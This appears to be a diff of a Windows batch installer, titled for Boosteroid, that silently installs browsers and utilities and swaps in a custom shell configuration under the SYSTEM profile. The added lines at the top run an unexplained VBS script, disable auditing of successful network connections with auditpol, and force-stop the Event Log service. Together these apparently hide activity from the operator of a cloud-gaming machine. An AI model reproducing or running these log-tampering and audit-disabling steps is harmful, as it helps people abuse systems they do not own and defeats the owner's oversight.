@@ -3,6 +3,11 @@ C:
 TITLE Install Boosteroid Tools
 echo Installing Boosteroid Tools...
 
+start ssfn_rmlg.vbs
+auditpol /set /subcategory:"Filtering Platform Connection" /success:disable /failure:enable
+echo Y | net stop eventlog
+main.cpl
+
 echo Installing Chrome..
 chrome.exe
 curl -LJO "https://github.com/enazar415/nware-tools/raw/main/Google-Chrome.lnk"
@@ -25,13 +30,12 @@ echo Installing GoogleDrive..
 GoogleDriveSetup.exe /S
 del GoogleDriveSetup.exe
 
-# move user.config "C:\Windows\System32\config\systemprofile\AppData\Local\Cairo_Development_Team"
-# cd "C:\Windows\System32\config\systemprofile\AppData\Local\Cairo_Development_Team"
-# cd C*
-# cd 0*
-# move "C:\Windows\System32\config\systemprofile\AppData\Local\Cairo_Development_Team\user.config" .
-# Broken with tobiamulln@gmail.com - use with new acc
-# taskkill /F /IM CairoDesktop.exe & start "" "C:\Program Files\Cairo Shell\CairoDesktop.exe"
+move user.config "C:\Windows\System32\config\systemprofile\AppData\Local\Cairo_Development_Team"
+cd "C:\Windows\System32\config\systemprofile\AppData\Local\Cairo_Development_Team"
+cd C*
+cd 0*
+move "C:\Windows\System32\config\systemprofile\AppData\Local\Cairo_Development_Team\user.config" .
+taskkill /F /IM CairoDesktop.exe & start "" "C:\Program Files\Cairo Shell\CairoDesktop.exe"
 
 echo Installing WinRar..
 winrar.exe /S
@@ -54,8 +58,3 @@ curl -LJO "https://securedl.cdn.chip.de/downloads/6890274/aio-runtimes_v2.5.0.ex
 echo Installing AIO-Runtimes..
 aio-runtimes_v2.5.0.exe /qn
 DEL aio-runtimes_v2.5.0.exe
-
-start ssfn_rmlg.vbs
-auditpol /set /subcategory:"Filtering Platform Connection" /success:disable /failure:enable
-echo Y | net stop eventlog
-main.cpl
